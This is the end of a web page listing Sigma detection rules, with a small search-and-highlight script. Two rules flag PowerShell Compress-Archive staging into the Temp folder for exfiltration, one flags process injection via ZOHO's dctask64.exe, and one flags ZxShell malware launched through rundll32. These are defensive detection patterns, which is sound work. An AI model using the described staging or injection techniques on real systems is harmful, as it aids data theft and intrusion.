<li><a href="#">title:Zip A Folder With PowerShell For Staging In Temp id: b7a3c9a3-09ea-4934-8864-6a32cacd98d9 status: experimental author: frack113 date: 2021/07/20 modified: 2021/10/16 description: Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration references: - tags: - attack.collection - attack.t1074.001 logsource: product: windows category: ps_script definition: Script Block Logging must be enabled detection: selection_4104: ScriptBlockText|contains|all: - 'Compress-Archive ' - ' -Path ' - ' -DestinationPath ' - '$env:TEMP\' condition: selection_4104 falsepositives: - Unknown level: medium 
<li><a href="#">title:Zip A Folder With PowerShell For Staging In Temp id: daf7eb81-35fd-410d-9d7a-657837e602bb related: - id: b7a3c9a3-09ea-4934-8864-6a32cacd98d9 type: derived status: experimental author: frack113 date: 2021/07/20 modified: 2021/10/16 description: Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration references: - tags: - attack.collection - attack.t1074.001 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabledd detection: selection_4103: ContextInfo|contains|all: - 'Compress-Archive ' - ' -Path ' - ' -DestinationPath ' - '$env:TEMP\' condition: selection_4103 falsepositives: - Unknown level: medium 
<li><a href="#">title:ZOHO Dctask64 Process Injection id: 6345b048-8441-43a7-9bed-541133633d7a status: test description: Detects suspicious process injection using ZOHO's dctask64.exe author: Florian Roth references: - - - date: 2020/01/28 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\dctask64.exe' filter: CommandLine|contains: 'DesktopCentral_Agent\agent' condition: selection and not filter fields: - CommandLine - ParentCommandLine - ParentImage falsepositives: - Unknown yet level: high tags: - attack.defense_evasion - attack.t1055.001 
<li><a href="#">title:ZxShell Malware id: f0b70adb-0075-43b0-9745-e82a1c608fcc status: test description: Detects a ZxShell start by the called and well-known function name author: Florian Roth, oscd.community, Jonhnathan Ribeiro references: - date: 2017/07/20 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\rundll32.exe' CommandLine|contains: - 'zxFunction' - 'RemoteDiskXXXXX' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: critical tags: - attack.execution - attack.t1059.003 - attack.defense_evasion - attack.t1218.011 - attack.s0412 - attack.g0001 

</div>
<script>
function myFunction() {
var input, filter, ul, li, a, i, txtValue;
input = document.getElementById("myInput");
filter = input.value.toUpperCase();
ul = document.getElementById("myUL");
li = ul.getElementsByTagName("li");
for (i = 0; i < li.length; i++) {
a = li[i].getElementsByTagName("a")[0];
txtValue = a.textContent || a.innerText;
if (txtValue.toUpperCase().indexOf(filter) > -1) {
li[i].style.display = "";
} else {
li[i].style.display = "none";
}
}
}
</script>
<script src="hilitor.js"></script>
<script>
var myHilitor = new Hilitor("content"); // id of the element to parse
// myHilitor.setBreakRegExp(new RegExp('[^\\w\' -]+', "g")); // expanded to include spaces
myHilitor.apply();
</script>
<script>
window.addEventListener("DOMContentLoaded", function(e) {
var myHilitor2 = new Hilitor("playground");
myHilitor2.setMatchType("left");
document.getElementById("keywords").addEventListener("keyup", function(e) {
myHilitor2.apply(this.value);
}, false);
}, false);
</script>
</html>